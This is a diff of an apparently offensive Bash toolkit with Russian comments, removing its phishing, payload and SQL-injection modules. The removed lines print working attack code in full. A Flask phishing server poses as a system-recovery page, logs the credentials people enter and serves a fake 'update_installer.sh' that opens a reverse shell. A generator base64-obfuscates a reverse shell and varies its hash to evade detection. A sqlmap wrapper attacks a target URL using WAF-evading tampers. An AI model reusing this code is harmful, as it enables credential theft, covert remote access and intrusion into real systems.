@@ -2144,7 +2144,6 @@ get_tool_info() {
         # --- Главное меню (Main Menu) ---
         "run_ghost_commander")      echo "ADB-контроль Android: зеркало, биометрия, Shell, управление файлами." ;;
         "run_phantom_engine")       echo "Social Engineering Framework: создание фишинг-страниц и сбор сессий." ;;
-        "run_sql_adaptive")         echo "Инструментарий для SQL-инъекций: адаптивный поиск и дамп баз данных." ;;
         "run_device_hack")          echo "Комплексный анализ: сетевая разведка, Bluetooth и глубокий аудит." ;;
         "run_smart_osint_engine")   echo "OSINT-движок: поиск по IP, почте, телефонам и доменам." ;;
         "run_iban_analyzer")        echo "Финансовый анализ: проверка IBAN, банковских кодов и транзакций." ;;
@@ -2664,51 +2663,6 @@ EOF
 
 
 
-
-generate_phantom_server_code() {
-    local target_file="$1"
-    local mode="$2"
-    local layout=$(generate_core_template)
-
-    cat << EOF > "$target_file"
-from flask import Flask, request, render_template_string, send_from_directory
-import os
-
-app = Flask(__name__)
-LOOT = "$LOOT_DIR/phantom_loot.log"
-
-$layout
-
-@app.route('/')
-def index():
-    content = """
-    <div class="status-box infected">CRITICAL SYSTEM ERROR: 0x80041F</div>
-    <p style='color:#888;'>Security token expired. Re-authentication required.</p>
-    <form method='post' action='/auth'>
-        <input type='text' name='u' placeholder='System ID / Email' required style='background:#000; color:#0cf; border:1px solid #333; padding:10px; width:85%; margin-bottom:10px;'>
-        <input type='password' name='p' placeholder='Secure Key' required style='background:#000; color:#0cf; border:1px solid #333; padding:10px; width:85%;'>
-        <button type='submit'>VERIFY & RECOVER</button>
-    </form>
-    """
-    if "$mode" != "creds":
-        content += "<p style='margin-top:20px; font-size:0.7em;'>Or download <a href='/download' style='color:#00ff41;'>Recovery Tool</a>.</p>"
-    
-    return render_template_string(render_prime_page("PHANTOM_RECOVERY_NODE", content))
-
-@app.route('/auth', methods=['POST'])
-def auth():
-    with open(LOOT, "a") as f:
-        f.write(f"[AUTH] {request.remote_addr} | U: {request.form.get('u')} | P: {request.form.get('p')}\n")
-    return render_template_string(render_prime_page("ACCESS_DENIED", "<div class='status-box infected'>INVALID CREDENTIALS</div><a href='/' class='btn'>RETRY</a>"))
-
-@app.route('/download')
-def download():
-    return send_from_directory("$LOOT_DIR", "update_installer.sh", as_attachment=True)
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=80)
-EOF
-}
 
 
 generate_mem_inject_code_raw() {
@@ -3264,64 +3218,11 @@ run_update_prime() {
     exec bash "$target"
 }
 
-
-# --- ENGINE: DYNAMIC POLYMORPHISM (ZERO-FOOTPRINT) ---
-
-generate_poly_payload() {
-    core_engine_ui "h" "PRIME POLYMORPH: GHOST PAYLOAD GENERATOR"
-    
-    # Слой 1: Ввод данных через стандартные Органы Чувств [3]
-    local lhost=$(core_engine_input "text" "Enter local IP for Listener")
-    [[ -z "$lhost" ]] && return
-    
-    local lport=$(core_engine_input "text" "Enter local Port")
-    [[ -z "$lport" ]] && return
-
-    local raw_payload="bash -i >& /dev/tcp/$lhost/$lport 0>&1"
-    local output_file="$PRIME_LOOT/ghost_payload_$RANDOM.sh"
-
-    # Слой 2: Визуализация процесса через новый прогресс-бар (В ОДНУ СТРОКУ)
-    core_engine_progress 1 "POLYMORPH_ENGINE_INIT"
-
-    # 1. Генерируем случайный ключ обфускации
-    local key=$(tr -dc 'A-Za-z0-9' < /dev/urandom | head -c 16)
-    
-    # 2. Создаем "Мусорный код" для изменения хеш-суммы
-    local junk="# $(date +%s) | $(tr -dc 'a-z' < /dev/urandom | head -c 32)"
-
-    # 3. Применяем Base64 (динамическая обфускация)
-    local encoded=$(echo -n "$raw_payload" | base64 | tr -d '\n')
-    
-    # Сборка финального стелс-файла
-    {
-        echo "#!/bin/bash"
-        echo "$junk"
-        echo "K=\"$key\""
-        echo "echo \"$encoded\" | base64 -d | bash"
-    } > "$output_file"
-
-    chmod +x "$output_file"
-
-    # Слой 3: Финальный отчет без мусора
-    core_engine_ui "line" ""
-    core_engine_ui "s" "Polymorphic Payload Secured"
-    echo -e "${B}Path:${NC} $output_file"
-    echo -e "${Y}Signature:${NC} $(sha256sum "$output_file" | awk '{print $1}')"
-    core_engine_ui "line" ""
-    
-    # Регистрация артефакта в Сборщике трофеев [11]
-    core_engine_loot "payload" "Generated poly-payload for $lhost:$lport"
-
-    # Один финальный wait, чтобы пользователь успел скопировать путь
-    core_engine_wait
-}
-
-
 # ==============================================================================
 # @description: Модуль сбора системной информации и разведки вебхуков (RECON v2.6)
 # ==============================================================================
 run_system_info() {
-   # clear
+   #clear
     # Слой 1: Заголовок через компоненты интерфейса Ядра
     core_engine_ui "h" "PRIME INTELLIGENCE & RECON v2.6"
 
@@ -3659,149 +3560,6 @@ run_network_analyzer() {
     done
 }
 
-run_phantom_engine() {
-    clear
-    core_engine_ui "h" "PRIME PHANTOM FRAMEWORK"
-
-    # Используем системные переменные ядра
-    local local_ip=$(ip route get 1.2.3.4 | awk '{print $7}' | head -n1)
-    local my_host="${HOSTNAME:-localhost}"
-    local srv_path="/tmp/phantom_srv.py" # Перенесли в /tmp для стерильности
-    local payload_name="update_installer.sh"
-    local payload_path="$PRIME_LOOT/$payload_name"
-
-    # Выбор стратегии через компактный ввод
-    core_engine_ui "i" "Select Attack Strategy:"
-    echo -e " 1) Credential Capture"
-    echo -e " 2) Full Hybrid (Creds + Payload)"
-    echo -e " 3) Cancel"
-    
-    local choice=$(core_engine_input "select" "Strategy")
-    [[ "$choice" == "3" || -z "$choice" ]] && return
-
-    local attack_type="creds"
-    [[ "$choice" == "2" ]] && attack_type="hybrid"
-
-    # --- ФАЗА ГЕНЕРАЦИИ (БЕЗ ЛЕСТНИЦЫ) ---
-    core_engine_progress 1 "FORGING_PAYLOAD"
-    
-    # Создаем Payload
-    cat <<EOF > "$payload_path"
-#!/bin/bash
-# System update for $my_host
-echo 'Updating system components...'
-bash -i >& /dev/tcp/$local_ip/4444 0>&1 &
-EOF
-    chmod +x "$payload_path"
-
-    # --- ФАЗА АКТИВАЦИИ ---
-    if command -v python3 >/dev/null; then
-        # Генерируем код сервера (предполагаем, что функция существует)
-        generate_phantom_server_code "$srv_path" "$attack_type" 2>/dev/null
-        
-        core_engine_ui "w" "Activating Phantom Gate on port 80..."
-        # Тихая очистка порта
-        fuser -k 80/tcp >/dev/null 2>&1
-        
-        # Запуск в фоне
-        python3 "$srv_path" > /dev/null 2>&1 &
-        
-        core_engine_ui "s" "PHANTOM GATEWAY OPERATIONAL"
-        
-        # Информационная панель
-        core_engine_ui "line" ""
-        echo -e "${Y}--- Gateway Info ---${NC}"
-        echo -e "${G} >> URL:${NC}      http://${local_ip}"
-        echo -e "${G} >> Payload:${NC}  /${payload_name}"
-        echo -e "${G} >> Strategy:${NC} ${attack_type}"
-        core_engine_ui "line" ""
-        
-        # Фиксация в трофеях
-        core_engine_loot "phantom" "Gateway active at http://$local_ip ($attack_type)"
-    else
-        core_engine_ui "e" "Python3 missing. Operation aborted."
-    fi
-
-    # Финальное ожидание (вместо pause)
-    core_engine_wait
-}
-
-
-# ==============================================================================
-# @description: Модуль адаптивного тестирования SQL-контуров
-# Интегрирован под ультимативные матрицы ядра фреймворка
-# АВТОПИЛОТ: Автоматическое выполнение и логирование сразу после ввода цели
-# ==============================================================================
-run_sql_adaptive() {
-    # Слой 1: Заголовок через Голос [1]
-    core_engine_ui "PRIME MUTAGEN: SQL INJECTION ENGINE v8.5"
-
-    # Слой 2: Органы чувств [3] - Запрос цели
-    local target_url=$(core_engine_input "text" "Enter Target URL")
-    [[ -z "$target_url" ]] && return
-
-    # Динамический выбор случайного User-Agent из глобальной матрицы UA
-    local ua_size=${#GLOBAL_NETWORK_UA[@]}
-    local random_index=$(( RANDOM % ua_size ))
-    local selected_ua="${GLOBAL_NETWORK_UA[$random_index]}"
-
-    # Слой 3: Эвристика и анализ WAF через Глушитель [7]
-    core_engine_ui "i" "Probing WAF/IPS resistance layers..."
-    # Подставляем динамически выбранный User-Agent из матрицы
-    local waf_reaction=$(curl -s -o /dev/null -w "%{http_code}" -A "$selected_ua" "$target_url%27%20OR%201=1")
-    
-    # Слой 4: НЕЙРОННАЯ МУТАЦИЯ через узел [4]
-    # Используем системный мутатор для генерации уникального агента
-    local neural_agent="Prime-$(core_engine_mutate "agent" "neural")-$RANDOM"
-    core_engine_ui "+" "Neural Header Generated: $neural_agent"
-
-    # Слой 5: Адаптивное вычисление агрессии (Мозг [5])
-    local aggr=$(( (waf_reaction / 100) ))
-    [[ $aggr -lt 2 ]] && aggr=2 
-
-    # Матрица тамперов (интегрирована в логику)
-    local t_matrix
-    case "$aggr" in
-        2) t_matrix="between,randomcase" ;;
-        4) t_matrix="between,charencode,space2comment,versionedmorekeywords" ;;
-        *) t_matrix="between,charencode,space2comment,randomcase,percentage" ;;
-    esac
-
-    core_engine_ui "+" "Applying Neural Obfuscation: $t_matrix"
-
-    # Слой 6: Исполнение и Сбор трофеев [11]
-    # Используем временную директорию внутри структуры PRIME_LOOT
-    local out_dir="${BASE_DIR:-./}/prime_loot/mutagen_$RANDOM"
-    
-    core_engine_ui "i" "Launching evolved payload stream..."
-    
-    # Запуск в фоне с подавлением мусора через Глушитель
-    {
-        sqlmap -u "$target_url" --batch --random-agent --user-agent="$neural_agent" \
-        --smart --mobile --output-dir="$out_dir" --flush-session \
-        --tamper="$t_matrix" --level=$aggr --risk=2 \
-        --delay=$((aggr / 2)) --threads=1 >/dev/null 2>&1
-    } &
-
-    # Визуализация через Синхронизацию [13]
-    core_engine_progress 15 "Neural-Evolving payload mutations"
-
-    # Слой 7: Интеллектуальный синтез и логирование [11]
-    local log_file=$(find "$out_dir" -name "log" 2>/dev/null)
-    if [[ -f "$log_file" ]]; then
-        core_engine_ui "+" "EXPLOIT SECURED: Findings integrated."
-        
-        # Структурированная запись в лут через Сборщик
-        local findings=$(grep -Ei "Type:|Payload:|Parameter:" "$log_file")
-        core_engine_loot "sql_success" "TARGET: $target_url\nAGGR: $aggr\n$findings"
-    fi
-
-    # Сигнал для моста [10]
-    echo "[$(date)] SRC: $target_url | AGGR: $aggr" >> "${BASE_DIR:-./}/prime_loot/bridge_signals.log"
-    
-    # Очистка через Санитара [8]
-    core_engine_remove "$out_dir"
-}
 
 
 # ==============================================================================
@@ -6410,8 +6168,8 @@ menu_forensics() {
 
 menu_cyber_ops() {
     core_engine_ui "h" "CYBER OPERATIONS SECTOR"
-    local names="Ghost_Commander PC_Control Ultimate_Exploit Omega_Auditor Polymorph_Gen"
-    local funcs="run_ghost_commander pc_password_recovery run_prime_exploiter_v5  run_prime_auditor_v2 generate_poly_payload"
+    local names="Ghost_Commander PC_Control Ultimate_Exploit Omega_Auditor"
+    local funcs="run_ghost_commander pc_password_recovery run_prime_exploiter_v5  run_prime_auditor_v2"
     prime_dynamic_controller "CYBER_OPS" "$names" "$funcs"
 }
 
@@ -6424,8 +6182,8 @@ menu_crypto_lab() {
 
 menu_net_infra() {
     core_engine_ui "h" "NETWORK INFRASTRUCTURE"
-    local names="Device_Hack Mesh_Bridge Server_Control Phantom_Engine"
-    local funcs="run_device_hack run_mesh_bridge run_servers run_phantom_engine"
+    local names="Device_Hack Mesh_Bridge Server_Control"
+    local funcs="run_device_hack run_mesh_bridge run_servers"
     prime_dynamic_controller "NET_INFRA" "$names" "$funcs"
 }
 
